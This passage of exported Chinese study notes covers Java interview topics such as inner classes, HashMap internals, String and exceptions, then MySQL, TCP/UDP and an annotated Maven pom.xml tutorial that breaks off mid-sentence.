当成员内部类拥有和外部类同名的成员变量或者方法时，在成员内部类中，默认情况下访问的是成员内部类的成员\n- 如果访问外部类的同名成员，需要以`外部类.this.成员变量/方法`形式来访问\n- 成员内部类是依附外部类而存在的，如果要创建成员内部类的对象，前提是必须存在一个外部类的对象\n- 创建成员内部类对象的三种方法\n```java\n// 第一种\nOuter.Inner in = new Outer().new Inner();\n\n//第二种\nOuter out = new Outer();\nOuter.Inner in = out.new Inner();\n\n//第三种\nOuter out = new Outer();\nOuter.Inner in = out.getInnerInstance();\n```\n\n### 静态内部类\n- 可以使用static关键字来修饰一个成员内部类，此时就称为静态内部类。它可以在不创建外部类对象的情况下被实例化，创建静态内部类对象的具体语法格式如下\n```java\nOuter.Inner in = new Outer.Inner();\n```\n- 静态内部类只能访问外部类的静态成员\n- 静态内部类中可以定义静态成员，而非静态内部类中不能定义静态成员\n\n### 方法内部类\n- 方法内部类是在成员方法中定义的类，只能在当前方法中被使用\n- 方法内部类对象不能使用该内部类所在方法中的非final局部变量, 但注意，在jdk1.7之前需要手动将方法内部类使用的变量设置为final, 而在jdk1.7之后，jvm会自动将其设置为final, 而不需要手动添加final\n\n### 匿名内部类\n- 匿名内部类就是没有名字的方法内部类，不使用关键字class、extends、implements没有构造方法\n- 匿名内部类必须要继承一个父类或者实现一个接口，没有class关键字，直接使用new来生成一个隐式的对象引用\n- 一定是在new的后面，用其隐含实现一个接口或者继承一个类 \n\n\n## 重载（Overload）和重写（Override）的区别。重载的方法能否根据返回类型进行区分？\n方法的重载和重写都是实现多态的方式，区别在于前者实现的是编译时的多态性，而后者实现的是运行时的多态性。\n- 重载：发生在同一个类中，方法名相同参数列表不同（参数类型不同、个数不同、顺序不同），与方法返回值和访问修饰符无关，**即重载的方法不能根据返回类型进行区分**\n- 重写：发生在父子类中，方法名、参数列表必须相同，返回值小于等于父类，抛出的异常小于等于父类，访问修饰符大于等于父类（里氏代换原则）；如果父类方法访问修饰符为private则子类中就不是重写。\n\n## BIO，NIO，AIO有什么区别？\n- BIO: BlockIO同步阻塞式IO，就是我们平常使用的传统I0，它的特点是模式简单使用方便，并发处理能力低。\n- NIO:Non IO同步非阻塞IO，是传统IO的升级，客户端和服务器端通过Channel（通道）通讯，实现了多路复用。\n- AIO：AsynchronousIO是NIO的升级，也叫NIO2，实现了异步非堵塞IO，异步IO的操作基于事件和回调机制。\n\n## String为什么是不可变的\n简单来说就是String类利用了final修饰的char类型数组存储字符\n\n## 是否可以继承 String类\nString类是final类，不可以被继承。\n\n## 如何将字符串反转\n使用StringBuilder或者stringBuffer的reverse()方法\n\n## String、StringBuilder与StringBuffer之间的区别\nString不可变，支持并发操作，线程安全的，适合多线程中使用。\nStringBufferd可变，支持并发操作，线性安全的，适合多线程中使用。\nStringBuilder可变，不支持并发操作，线性不安全的，不适合多线程中使用\n\n## 在使用HashMap的时候，用String做key有什么好处？\n因为HashMap判重以及根据key获取value都是是根据key的HashCode(),equals()来判断的。\n所以从String的源码出发来分析, 以下是源码：\n```java\npublic int hashCode() {\n        int h = hash;     //private int hash; // Default to 0\n        if (h == 0 && value.length > 0) {\n            char val[] = value;    //获得 String 对象底层的字符数组\n\n            for (int i = 0; i < value.length; i++) {\n                h = 31 * h + val[i];    //在计算的时候加的是 int 类型的 ascii 码\n            }\n            hash = h; //缓存该String的hashCode值\n        }\n        return h;\n    }\n```\n从源码我们可以分析出用String做key的2个原因：\n1. 因为String对象的 hashCode()值是根据String对象的内容的，并不是根据对象的地址。所以内容相同的两个String对象具有相同的散列码，并且经过 equals() 判断后返回值为true。所以我们能很容易的根据string内容来获取value。\n2. 因为String是不可变的，且String中有个hash变量，它可以缓存hashCode，避免重复计算hashCode\n\n## 获取键盘输入常用的两种方法\n方法1： 通过Scanner\n```java\nScanner input = new Scanner(System.in);\nString s = input.nextLine();\ninput.close();\n```\n方法2: 通过BufferedReader\n```java\nBufferedReader input = new BufferedReader(new InputStreamReader(System.in));\nString s = input.readLine();\n```\n\n## Session/Cookie区别？\nSession存储在服务器罐，类型可以是任意的Java对象\nCookie存储在客户端、类型只能为字符串\n\n## 多态\n多态性是指同名的不同方法在程序中共存，多态性又被称为'一个名字，多个方法'\n多态性的实现有如下两种：\n- 重写父类中的方法\n- 通过重载(重载是发生在同一个类中的)：即定义同一个类中的多个同名的不同方法来实现；\n\n\n## HashMap 底层是如何实现的？\n在 JDK 1.7 中 HashMap 是以数组加链表的形式组成的，JDK 1.8 之后新增了红黑树的组成结构，当链表大于 8 并且哈希表长度大于 64 时，链表结构会转换成红黑树结构\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123927.png)\n\nJDK 1.8 之所以添加红黑树是因为一旦链表过长，会严重影响 HashMap 的性能，而红黑树具有快速增删改查的特点，这样就可以有效的解决链表过长时操作比较慢的问题\n\n### 什么是加载因子？加载因子为什么是 0.75？\n所谓的加载因子，也叫扩容因子或者负载因子，它是用来进行扩容判断的。\n假设加载因子是0.5，HashMap初始化容量是16，当HashMap中有16 * 0.5=8个元素时，HashMap就会进行扩容操作。\n而HashMap中加载因子为0.75，是考虑到了性能和容量的平衡。\n由加载因子的定义，可以知道它的取值范围是(0, 1]。\n- 如果加载因子过小，那么扩容门槛低，扩容频繁，这虽然能使元素存储得更稀疏，有效避免了哈希冲突发生，同时操作性能较高，但是会占用更多的空间。\n- 如果加载因子过大，那么扩容门槛高，扩容不频繁，虽然占用的空间降低了，但是这会导致元素存储密集，发生哈希冲突的概率大大提高，从而导致存储元素的数据结构更加复杂（用于解决哈希冲突），最终导致操作性能降低。\n-  还有一个因素是为了提升扩容效率。因为HashMap的容量（size属性，构造函数中的initialCapacity变量）有一个要求：它一定是2的幂。所以加载因子选择了0.75就可以保证它与容量的乘积为整数。 \n\n### resize方法\n在Java中，数组是无法自动扩容的，所以扩容的方法是使用一个新的数组代替已有的容量小的数组，简单说就是换一个更大的数组重新映射\n**什么时候发生扩容？**\n当HashMap中的元素个数超过数组大小 x 加载因子时，就会进行数组扩容，上文中我们知道加载因子默认值为0.75，也就是说，默认情况下，数组大小为16，那么当HashMap中元素个数超过16 x 0.75=12的时候，就把数组的大小扩展为2 x 16=32，即扩大一倍，然后重新计算每个元素在数组中的位置，而这是一个非常消耗性能的操作， 而JDK 1.8 在扩容时并没有像 JDK 1.7 那样，重新计算每个元素的哈希值，而是通过高位运算（e.hash & oldCap）来确定元素是否需要移动，这种方式更加高效\n比如 key1 的信息如下：\nkey1.hash = 10 0000 1010\noldCap = 16 0001 0000\n使用 e.hash & oldCap 得到的结果，高一位为 0，当结果为 0 时表示元素在扩容时位置不会发生任何变化，而 key 2 信息如下：\nkey2.hash = 10 0001 0001\noldCap = 16 0001 0000\n这时候得到的结果，高一位为 1，当结果为 1 时，表示元素在扩容时位置发生了变化，新的下标位置等于原下标位置 + 原数组长度，如下图所示：\n\n### HASHMAP之扰动函数和低位掩码\n我们都知道，hashMap在实现的时候，为了寻找在数组上的位置，主要做了两件事\n```java\nint hash = hash(key);\nint i = indexFor(key, table.length);\n```\n这两个方法详解如下\n\nJDK8对扰动函数的修改，只进行了一次移位（又移16bit），再和key.hashCode()做异或，如图\n```java\nstatic final int hash(Object key){\n    int h;\n    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);\n}\n```\n这个散列值是不能直接拿来用的。用之前还要先做对数组的长度取模运算，得到的余数才能用来访问数组下标。源码中模运算是在这个indexFor( )函数里完成的。\n```java\nbucketIndex = indexFor(int h, table.length);\n```\n其中IndexFor代码\n```java\nstatic int indexFor(int h, int length){\n    return h & (length - 1);\n}\n```\nindexFor代码，正好解释了为什么HashMap的数组长度要取2的整次幂。因为这样（数组长度-1）正好相当于一个“低位掩码”。“与”操作的结果就是散列值的高位全部归零，只保留低位值，用来做数组下标访问。以初始长度16为例，16-1=15。2进制表示是00000000 00000000 00001111。和某散列值做“与”操作如下，结果就是截取了最低的四位值。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123937.png)\n\n但这时候问题就来了，这样就算我的散列值分布再松散，要是只取最后几位的话，碰撞也会很严重。更要命的是如果散列本身做得不好，分布上成等差数列的漏洞，恰好使最后几个低位呈现规律性重复，就无比蛋疼。\n这时候“扰动函数”的价值就体现出来了，说到这里大家应该猜出来了。看下面这个图，\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123949.png)\n\n右位移16位，正好是32bit的一半，自己的高半区和低半区做异或，就是为了混合原始哈希码的高位和低位，以此来加大低位的随机性。而且混合后的低位掺杂了高位的部分特征，这样高位的信息也被变相保留下来。\nJDK 7做了4次右移，估计是边际效应的原因，JDK8就只做了一次右移。\n另外 JDK8在链表长度超过8的时候，就使用红黑树做存储。这一改变大大优化了很多性能。\n\n### HashMap 是如何导致死循环的\nHashMap会导致死循环是在jdk1.7中，由于扩容时的操作是使用头插法，在多线程的环境下可能产生循环链表，由此导致了死循环。在jdk1.8中改为使用尾插法，避免了该死循环的情况。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123959.png)\n\n## ArrayList\nArrayList作为List的典型实现，完全实现了List的全部接口功能，它是基于数组实现的List类，它封装了一个`Object[]`类型的数组，长度可以动态的增长。通过无参数构造方法创建对象时，JDK1.7初始长度是10；JDK1.8中初始长度是0，在第一次添加元素时再给出长度10。 它默认创建一个长度为10的数组，当新添加的元素已经没有位置存放的时候, ArrayList就会自动进行扩容，扩容的长度为原来长度的1.5倍。它的线程是不安全的。\n\n## java集合里有一个迭代器，为什么要设计出这个迭代器\n首先使用迭代器适用性强，因为如果用for循环遍历，需要事先知道集合的数据结构，而且当换了一种集合的话代码不可重用要修改，不符合开闭原则。而Iterator是用同一种逻辑来遍历集合。其次使用Iterator可以在不了解集合内部数据结构的情况下直接遍历，这样可以使得集合内部的的数据不暴露。\n\n## 防止表单重复提交的2种方式\n**通过JavaScript屏蔽提交按钮（不推荐）**\n通过js代码，当用户点击提交按钮后，屏蔽提交按钮使用户无法点击提交按钮或点击无效，从而实现防止表单重复提交。\nps：js代码很容易被绕过。比如用户通过刷新页面方式，或使用postman等工具绕过前段页面仍能重复提交表单。因此不推荐此方法。\n\n**利用Session防止表单重复提交（推荐）**\n实现原理：\n服务器返回表单页面时，会先生成一个subToken保存于session，并把该subToen传给表单页面。当表单提交时会带上subToken，服务器拦截器Interceptor会拦截该请求，拦截器判断session保存的subToken和表单提交subToken是否一致。若不一致或session的subToken为空或表单未携带subToken则不通过。\n首次提交表单时session的subToken与表单携带的subToken一致走正常流程，然后拦截器内会删除session保存的subToken。当再次提交表单时由于session的subToken为空则不通过。从而实现了防止表单重复提交。\n\n## NoClassDefFoundError与ClassNotFoundException的区别\n一个直观的区别是一个是异常，一个是错误，异常和错误的区别就可以先讲一波。\n\n**ClassNotFoundException**\n当应用尝试在类路径中用全限量名去加载某个类时，如果找你不到它的定义就会报CLassNotFoundException 。它是一个可检测异常。\n通常出现在用Class.forName(), ClassLoader.loadClass()或 ClassLoader.findSystemClass()这三个方法加载类的时候。我们在使用反射的时候，要特别注意这个异常。\n\n**NoClassDefFoundError**\nNoClassDefFoundError是一种致命错误。\n当JVM尝试通过new关键字创建一个类实例或者方法调用来加载一个类时找不到这个类的定义就会出现这个错误。\n通常是编译时正常编译，但是运行时找不到这个类。\n通常发生在执行动态代码块或者初始化静态字段时报了异常，从而导致类初始化失败而引发NoClassDefFoundError。\n\n## 构造器（constructor）是否可被重写（override）\n构造器不能被继承，因此不能被重写，但可以被重载。\n\n## HashCode()与equals()的相关规定\n如果两个对象调用equals()方法，返回true，那么规定这两个对象的HashCode()返回的值应该要相同\n所以，equals方法被覆盖过，则hashcode方法也必须被覆盖\n\n## 对象的相等与指向他们的引用相等，两者有什么不同？\n对象的相等比的是内存中存放的内容是否相等而引用相等比较的是他们指向的内存地址是否相等。\n\n## 值传递与引用传递\n**值传递：**把实参的值传递给形参\n**引用传递：**把实参的地址传递给形参，此时形参的地址为实参的地址\n\njava中只有值传递\n\n## import java和javax有什么区别\n刚开始的时候JavaAPI所必需的包是java开头的包，javax当时只是扩展API包来说使用。然而随着时间的推移，javax逐渐的扩展成为JavaAPI的组成部分。但是，将扩展从javax包移动到java包将是太麻烦了，最终会破坏一堆现有的代码。因此，最终决定javax包将成为标准API的一部分。\n所以，实际上java和javax没有区别。这都是一个名字。\n\n# Mysql\n## 批量向MySQL导入1000万条数据的优化\n1. 在事务中插入处理\n将插入修改为\nstart transaction;\ninsert into tb1(id,name,age,sex) values(1,'khue',25,'m');\ninsert into tb1(id,name,age,sex) values(2,'green',24,'w');\ncommit;\n在事务中可以提高数据的插入效率，因为在进行一个insert操作时，MySQL内部会建立一个事务，在事务内才能进行真正的插入处理操作，这样可以减少创建事务的消耗，让所有插入都在执行后才进行提交操作\n2. 修改表的存储引擎InnoDB为MyISAM。(因为InnoDB中存在redo log日志，每次更新表的结果先写入redo log中，等redo log满了之后再写入磁盘而这个过程是会停止其他所有的事务)\n3. 尽量顺序插入(存储引擎底层采用的数据结构是B+tree索引，如果每次插入记录都在索引的最后面，索引的定位效率很高，并且对索引调整较小；如果插入的记录在索引中间，则需要维护B+tree并且索引定位效率会下降，数据量较大时会有频繁的磁盘操作)\n4. 合并SQL语句\n一条SQL插入一条数据\ninsert into tb1(id,name,age,sex) values(1,'khue',25,'m');\ninsert into tb1(id,name,age,sex) values(2,'green',24,'w');\n一条SQL插入多条数据\ninsert into tb1(id,name,age,sex) values(1,'khue',25,'m'),(2,'green',24,'w');\n合并SQL语句能够提高程序的插入效率(原因在于合并后日志量减少了，降低日志刷盘的数据量和频率)，也能减少SQL语句解析的次数，减少网络传输的IO\n\n# 计网\n## TCP与UDP的区别\nUDP：无连接， 提供最大努力的交互，即不保证可靠交付，面向报文的，有差错直接丢弃。 执行速度快、实时性好，如dns、实时传输协议、小文本传输协议\nTCP：面向字节流的，不提供广播或组播服务（ipv6没有广播地址，由组播代替），适用于可靠性更重要的场合，如文件传输协议、http\n"
  },
  {
    "title": "./notes/back-end/maven.md",
    "body": "# Ant\n1. Ant和Maven都是项目构建工具\n2. 在项目的运行编译打包等过程需要依赖于Ant构建工具\n\n# 分布式\n1. 传统项目部署：\n1.1 新建一个项目，通过不同的包来区分不同的模块\n1.2 把这一个项目发布到服务器（tomcat）中\n2. 分布式项目部署(适合于高负载情况下)\n2.1 完整的项目拆分成多个项目，把拆分后的项目分别部署到对应的服务器(tomcat)中的过程叫做分布式项目部署把一个\n\n# Maven简介\n基于Ant的构建工具，Ant有的功能Maven都有,额外添加了其他功能\n\n## Maven约定的工程目录：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220222144233.png)\n\n## 运行原理图\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408234938.png)\n\n1. 本地仓库：计算机中的一个文件夹，通过setting.xml来自定义是哪个文件夹\n```xml\n<localRepository>F:\\RepMaven</localRepository>\n```\n\n2. 中央仓库：网上地址：https://reop1.maven.org/maven2/ 由于是国外的网站，所以下载速度慢，所以在setting.xml中配置成国内的镜像（阿里云）\n```xml\n<mirror>\n      <id>alimaven</id>\n      <name>aliyun maven</name>\n      <url>http://maven.aliyun.com/nexus/content/groups/public/</url>\n      <mirrorOf>central</mirrorOf>\n    </mirror>\n    <mirror>\n      <id>repo2</id>\n      <name>repo2 maven</name>\n      <url>http://repo2.maven.org/maven2</url>\n      <mirrorOf>central</mirrorOf>\n    </mirror>\n```\n3. 保证JDK版本于开发环境一致，所以在setting.xml文件中配置JDK版本\n```xml\n<profile>\n      <id>jdk-1.8</id>\n      <activation>\n        <activeByDefault>true</activeByDefault>\n        <jdk>1.8</jdk>\n      </activation>\n      <properties>\n        <maven.compiler.source>1.8</maven.compiler.source>\n        <maven.compiler.target>1.8</maven.compiler.target>\n        <maven.compiler.compilerVersion>1.8</maven.compiler.compilerVersion>\n      </properties>\n    </profile>\n```\n\n## pom.xml中标签说明\n```xml\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n\n  <!-- 指定了当前POM的版本 -->\n  <modelVersion>4.0.0</modelVersion>\n\n  <!-- 项目坐标信息 -->\n  <!-- 项目主标识，用于定义当前项目属于的实际项目，格式与项目创建的包是一样的，公司域名反写-->\n  <groupId>com.jsun.demo</groupId>\n  <!-- 项目名或模块名或项目名+模块名组成 -->\n  <artifactId>demo-maven01</artifactId>\n  <!-- 当前项目版本号，一般由三个数字组成，第一个0表示大版本号，第二个0表示分支版本号，第三个1表示小版本号 -->\n  <!-- SNAPSHOT代表当前版本类型为快照版本，还有alpha内部版本、beta公测版本、release发布版本、ga正式版本等 -->\n  <version>0.0.1-SNAPSHOT</version>\n  <!-- maven打包方式，默认为jar，还有：pom,maven-plugin,war,rar,zip -->\n  <packaging>jar</packaging>\n\n  <!-- 用在子模块中，实现对父模块的继承 -->\n  <parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <version>1.2.5.RELEASE</version>\n  </parent>\n\n  <!-- 聚合多个maven项目，同时对所有聚合项目进行编译 -->\n  <modules>\n    <module></module>\n  </modules>\n\n  <!-- 项目描述名，url，详细描述，产生项目文档使用 -->\n  <name>Maven01</name>\n  <url>http://maven.apache.org</url>\n  <description>测试maven项目</description>\n\n  <!-- 开发人员列表，项目发布使用 -->\n  <developers>\n    <!-- 某个项目开发者的信息 -->\n    <developer>\n        <!-- 项目开发者的唯一标识符 -->\n        <id>001</id>\n        <!-- 项目开发者的全名 -->\n        <name>jsun</name>\n        <!-- 项目开发者的email -->\n        <email> jsun@163.com </email>\n        <!-- 项目开发者的主页的URL -->\n        <url />\n\n        <!-- 项目开发者在项目中扮演的角色，角色元素描述了各种角色 -->\n        <roles>\n            <role>developer</role>\n        </roles>\n\n        <!-- 项目开发者所属组织 -->\n        <organization>com-jsun</organization>\n        <!-- 项目开发者所属组织的URL -->\n        <organizationUrl> http://demo.jsun.com/jsun</organizationUrl>   \n    </developer>\n  </developers>\n\n\n  <!-- 许可证信息， -->\n  <licenses>\n    <license>\n        <name></name>\n        <!-- 官方的license正文页面的URL -->\n        <url></url>\n        <!-- 项目分发的主要方式：repo，可以从Maven库下载，manual，用户必须手动下载和安装依赖 -->\n        <distribution></distribution>\n        <!-- 关于license的补充信息 -->\n        <comments></comments>\n    </license>\n  </licenses>\n\n  <!-- 项目所属组织信息 -->\n  <organization>\n      <name></name>\n      <url></url>\n  </organization>\n\n\n  <!-- 属性列表，相当于定义的公共常量，引用方式比如：${project.build.sourceEncoding} -->\n  <properties>\n    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n    <junit.version>3.8.1</junit.version>\n  </properties>\n\n  <!-- 依赖列表 -->\n  <dependencies>\n    <!-- 具体依赖项，下面主要包含依赖的坐标、类型、范围等信息 -->\n    <dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-core</artifactId>\n      <version>1.2.6</version>\n\n      <!-- 依赖的类型 -->\n      <type>jar</type>\n\n\n      <!-- 项目如果要使用某个框架或依赖，需要把相关jar包引用到classpath中，maven项目提供了三个classpath：编译、测试、运行 -->\n      <!-- 依赖的范围用于控制依赖于三种classpath关系的，包括：compile、provided、runtime、test、system、import -->\n      <!-- \n        compile:默认范围，编译、测试、运行都有效\n        provided:编译和测试有效，最后运行不会被加入\n        runtime:在测试和运行的时候有效，编译不会被加入，比如jdbc驱动jar\n        test:测试阶段有效，比如junit\n        system:与provided一致，编译和测试阶段有效，但与系统关联，可移植性差\n        import:导入的范围，它只是用在dependencyManagement中，表示从其它的pom中导入dependency的配置\n       -->\n      <!-- 表示当前依赖只能在测试代码中引用使用，在主代码中引用使用则报错 -->\n      <scope>test</scope>\n\n\n      <!-- 排除依赖传递列表，比如A依赖B，B依赖C，但是A并没有使用C的功能，可以把C排除-->\n      <exclusions>\n        <exclusion></exclusion>\n      </exclusions>\n    </dependency>\n\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-configuration-processor</artifactId>\n            <!-- 主动设置禁止自己被传递，只在当前项目中使用 -->\n            <optional>true</optional>\n        </dependency>\n\n    <dependency>\n        <groupId>net.sf.json-lib</groupId>\n        <artifactId>json-lib</artifactId>\n        <!-- 在相同版本下针对不同的环境或者jdk使用的jar,如果配置了这个元素，则会将这个元素名在加在最后来查找相应的jar，\n        具体解释查看：http://www.cnblogs.com/lovingprince/archive/2010/09/19/2166273.html -->\n        <classifier>jdk15</classifier>\n        <version>2.4</version>\n    </dependency>\n  </dependencies>\n\n  <!-- 使用dependencyManagement标签管理依赖，实际管理的是依赖的版本号，让\n所有子项目中引用对应依赖而不用显式的列出版本号；\n依赖并不会在当前项目引入 -->\n  <dependencyManagement>\n    <dependencies>\n        <dependency>\n          <groupId>junit</groupId>\n          <artifactId>junit</artifactId>\n          <version>${junit.version}</version>      \n        </dependency>\n    </dependencies>\n  </dependencyManagement>\n\n  <!-- 构建插件 -->\n  <build>\n    <!-- \n        Maven定制化打包后的包名\n        Maven默认的包名为:<finalName>${project.artifactId}-${project.version}</finalName>\n        定制化想要的包名,如加上时间戳:<finalName>${project.artifactId}-${maven.build.timestamp}</finalName>\n    -->\n    <finalName>myProject</finalName>  \n\n    <!-- 将src/main/java目录下src/main/resources目录下适配通配符的文件也打包打进去.因为默认src/main/java下打包时只有class文件,src/main/resources下打包时将各种xml，properites，xsd文件等打包jar或者war里面,防止遗漏部分文件,可以在下面的标签设置 -->\n    <resources>\n        <resource>\n            <directory>src/main/java</directory>\n            <includes>\n                <include>**/*.properties</include>\n            </includes>\n        </resource>\n        <resource>\n            <directory>src/main/resources</directory>\n            <includes>\n                <include>**/*.*</include>\n            </includes>\n        </resource>\n    </resources>\n\n    <!-- 插件列表 -->\n    <plugins>\n        <!-- Source attach plugin 发布的包或者打包的时候会将源码也同时打出来 -->\n        <plugin>\n            <groupId>org.apache.maven.plugins</groupId>\n            <artifactId>maven-source-plugin</artifactId>\n            <version>2.4</version>\n            <executions>\n                <execution>\n                    <id>attach-sources</id>\n                    <phase>package</phase>\n                    <goals>\n                        <goal>jar</goal>\n                    </goals>\n                </execution>\n            </executions>\n        </plugin>\n        <!-- 指定maven编译的jdk版本,如果不指定,maven3默认用jdk 1.5 maven2默认用jdk1.3 --> \n        <plugin>\n            <groupId>org.apache.maven.plugins</groupId>\n            <artifactId>maven-compiler-plugin</artifactId>\n            <configuration>\n                <!-- 一般而言，target与source是保持一致的，但是，\n                有时候为了让程序能在其他版本的jdk中运行(对于低版本目标jdk，源代码中不能使用低版本jdk中不支持的语法)，\n                会存在target不同于source的情况 -->                    \n                <source>1.8</source> <!-- 源代码使用的JDK版本 -->                                                                                             \n                <target>1.8</target> <!-- 需要生成的目标class文件的编译版本 -->                                                                                     \n                <encoding>UTF-8</encoding><!-- 字符集编码 -->\n                <skipTests>true</skipTests><!-- 跳过测试 -->                                                                             \n                <verbose>true</verbose>\n                <showWarnings>true</showWarnings>                                                                                                               \n                <fork>true</fork><!-- 要使compilerVersion标签生效，还需要将fork设为true，用于明确表示编译版本配置的可用 -->                                                        \n                <executable><!-- path-to-javac --></executable><!-- 使用指定的javac命令，例如：<executable>${JAVA_1_4_HOME}/bin/javac</executable> -->           \n                <compilerVersion>1.3</compilerVersion><!-- 指定插件将使用的编译器的版本 -->                                                                         \n                <meminitial>128m</meminitial><!-- 编译器使用的初始内存 -->                                                                                      \n                <maxmem>512m</maxmem><!-- 编译器使用的最大内存 -->                                                                                              \n                <compilerArgument>-verbose -bootclasspath ${java.home}\\lib\\rt.jar</compilerArgument><!-- 这个选项用来传递编译器自身不包含但是却支持的参数选项 -->               \n            </configuration>\n        </plugin>\n\n        <!-- The configuration of maven-assembly-plugin; 其中设计的package.xml和pom.xml是同级目录结构文件,文件内容见下面的package.xml文件 -->\n        <plugin>\n            <groupId>org.apache.maven.plugins</groupId>\n            <artifactId>maven-assembly-plugin</artifactId>\n            <executions>\n                <execution>\n                    <id>make-assembly-platform</id>\n                    <phase>package</phase>\n                    <goals>\n                        <goal>single</goal>\n                    </goals>\n                    <configuration>\n                        <descriptors>\n                            <descriptor>package.xml</descriptor>\n                        </descriptors>\n                        <finalName>patch</finalName>\n                        <appendAssemblyId>false</appendAssemblyId>\n                    </configuration>\n                </execution>\n            </executions>\n        </plugin>\n\n        <!-- findbugs -->\n        <plugin>\n            <groupId>org.codehaus.mojo</groupId>\n            <artifactId>findbugs-maven-plugin</artifactId>\n            <configuration>\n                <!-- <excludeFilterFile>tools/findbugs/findbugs-exclude.xml</excludeFilterFile> -->\n                <threshold>High</threshold>\n                <effort>Default</effort>\n                <findbugsXmlOutput>true</findbugsXmlOutput>\n                <findbugsXmlOutputDirectory>target/site/findbugs</findbugsXmlOutputDirectory>\n            </configuration>\n        </plugin>       \n\n    </plugins>\n\n    <!-- 插件管理列表，与dependencyManagement标签作用相似，管理插件版本号，让子项目继承使用 -->\n    <pluginManagement>\n        <plugins>\n            <plugin>\n                <artifactId>maven-compiler-plugin</artifactId>\n                <!-- 插件扩展配置 -->\n                <!-- 更详细的例子：http://my.oschina.net/zh119893/blog/276090 -->\n                <configuration>\n                    <!-- 源代码编译版本 -->\n                    <source>1.7</source>\n                    <!-- 目标平台编译版本 -->\n                    <target>1.7</target>\n                    <!-- 设置编译字符集编码 -->\n                    <encoding>${project.build.sourceEncoding}</encoding>\n                </configuration>\n            </plugin>\n\n        </plugins>\n    </pluginManagement>\n  </build>\n</project>\n```\n\n### 表示坐标的标签\nMaven 的坐标 使用如下三个向量在 Maven 的仓库中唯一的确定一个 Maven 工程。\n- groupid：公司或组织的域名倒序+当前项目名称\n- artifactId：当前项目的模块名称\n- version：当前模块的版本\n```xml\n  <groupId>net.lazyegg.maven</groupId>\n  <artifactId>Hello</artifactId>\n  <version>0.0.1-SNAPSHOT</version>\n```\n\n如何通过坐标到仓库中查找 jar 包？将 gav 三个向量连起来\n```\nnet.lazyegg.maven+Hello+0.0.1-SNAPSHOT\n```\n以连起来的字符串作为目录结构到仓库中查找\n```\nnet/lazyegg/maven/Hello/0.0.1-SNAPSHOT/Hello-0.0.1-SNAPSHOT.jar\n```\n※ 注意：我们自己的 Maven 工程必须执行安装操作才会进入仓库。安装的命令是：mvn install\n\n### packaging标签\n项目的类型，最终会打包成什么类型，有以下类型\n– jar：java项目，内部调用或者是作为服务使用, 默认值\n– war：web项目,即需要部署的项目\n– pom：逻辑父项目，其项目只要含有子项目就必须为pom类型，pom 项目里没有java代码，也不执行任何代码，只是为了聚合工程或传递依赖用的。\n\n```xml\n<packaging>war</packaging>\n```\n\n### dependencyManagement标签\nMaven中的dependencyManagement元素提供了一种管理依赖版本号的方式。在dependencyManagement元素中声明所依赖的jar包的版本号等信息，那么所有子项目再次引入此依赖jar包时则无需显式的列出版本号。Maven会沿着父子层级向上寻找拥有dependencyManagement 元素的项目，然后使用它指定的版本号。\n**举例：**\n在父项目的POM.xml中配置：\n```xml\n<dependencyManagement>\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n            <version>1.2.3.RELEASE</version>\n        </dependency>\n    </dependencies>\n</dependencyManagement>\n```\n此配置即生命了spring-boot的版本信息。\n\n子项目则无需指定版本信息：\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\n**使用优点**\n如果有多个子项目都引用同一样依赖，则可以避免在每个使用的子项目里都声明一个版本号。当想升级或切换到另一个版本时，只需要在顶层父容器里更新，而不需要逐个修改子项目；另外如果某个子项目需要另外的一个版本，只需要声明version即可。\n\n**注意事项**\ndependencyManagement中定义的只是依赖的声明，并不实现引入，因此子项目需要显式的声明需要用的依赖。\n\n> dependencyManagement的另一个作用：见 `使用import scope解决maven继承（单）问题` 标题\n\n### 聚合相关标签\nMaven聚合（或者称为多模块），是为了能够使用一条命令就构建多个模块，例如已经有两个模块，分别为account-email,account-persist，我们需要创建一个额外的模块（假设名字为account-aggregator，然后通过该模块，来构建整个项目的所有模块，accout-aggregator本身作为一个Maven项目，它必须有自己的POM,不过作为一个聚合项目，其POM又有特殊的地方，看下面的配置：\n```xml\n<project xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n        xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0\n        http://maven.apache.org/maven-v4_0_0.xsd\">\n\n        <modelVersion>4.0.0</modelVersion>\n        <groupId>com.juvenxu.mvnbook.account</groupId>\n        <artifact>account-aggregator</artifact>\n        <version>1.0.0-SNAPSHOT</version>\n        <packaging>pom</packaging>\n        <name>Account Aggregator</name>\n\n        <modules>\n            <module>account-email</module>\n            <module>account-persist</module>\n        </modules>\n</project>\n```\n\n上面有一个特殊的地方就是packaging,其值为pom,如果没有声明的话，默认为jar，==对于聚合模块来说，其打包方式必须为pom==，否则无法构建。\nmodules里的每一个module都可以用来指定一个被聚合模块，这里每个module的值都是一个当前pom的相对位置，本例中account-email、account-persist位于account-aggregator目录下，当三个项目同级的时候，上面的两个module应该分别为../account-email和../account-persist\n\n### optional与exclusions标签\n**optional标签**\noptional是maven依赖jar时的一个选项,表示该依赖是不是可选的.会不会被依赖传递，默认值为false,即表示不是可选的，会被依赖传递\n\n画个图说明问题:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408234948.png)\n\n一个项目会依赖于 被依赖的项目 中所有`<optional>false</optional>`的依赖。例如上图，project D会依赖于project C中所有`<optional>false</optional>`的依赖。但是对于project D来说，不一定依赖于project A与proejct B, 所以我们应该在project C中的将project A与project 